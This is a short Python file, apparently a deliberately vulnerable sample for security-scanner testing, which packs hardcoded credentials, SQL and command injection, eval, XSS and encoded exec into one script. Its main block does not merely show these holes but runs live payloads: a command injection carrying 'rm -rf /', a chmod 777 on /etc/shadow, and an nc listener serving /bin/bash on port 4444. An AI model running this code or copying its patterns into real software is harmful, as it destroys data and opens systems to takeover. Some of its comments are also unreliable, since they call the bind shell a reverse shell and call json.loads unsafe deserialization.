import os
import subprocess
import json
import base64
import sqlite3

# Hardcoded credentials
API_KEY = "12345-SECRET-API-KEY"
password = "super_secret_password"

# SQL Injection vulnerability
def get_user_data(user_input):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{user_input}'"  # SQL Injection risk
    cursor.execute(query)
    return cursor.fetchall()

# Command Injection vulnerability
def run_command(user_input):
    os.system("echo " + user_input)  # Command Injection risk

# Insecure use of eval()
def execute_code(user_input):
    eval(user_input)  # Dangerous execution of arbitrary code

# XSS vulnerability
def render_html(user_input):
    html = f"<h1>Welcome {user_input}</h1>"  # XSS risk if user input is not sanitized
    return html

# Hardcoded sensitive data
config = {
    "username": "admin",
    "password": "hardcoded_password",
    "database_url": "postgres://admin:password@localhost/db"
}

# Unsafe deserialization
def load_config(data):
    return json.loads(data)  # Can lead to deserialization attacks if input is untrusted

# Privilege escalation attempt
def elevate_privileges():
    os.system("chmod 777 /etc/shadow")  # Very dangerous privilege escalation

# Backdoor creation
def create_backdoor():
    subprocess.Popen(["nc", "-lvp", "4444", "-e", "/bin/bash"])  # Opens a reverse shell

# Obfuscated Code
def obfuscated_function():
    exec(base64.b64decode("cHJpbnQoIkhlbGxvLCB3b3JsZCEiKQ=="))  # Encoded execution

if __name__ == "__main__":
    print("Testing security vulnerabilities...")
    print(get_user_data("admin' OR 1=1 --"))
    run_command("; rm -rf /")
    execute_code("__import__('os').system('ls')")
    print(render_html("<script>alert('XSS')</script>"))
    print(load_config('{"user":"test","password":"123"}'))
    elevate_privileges()
    create_backdoor()
    obfuscated_function()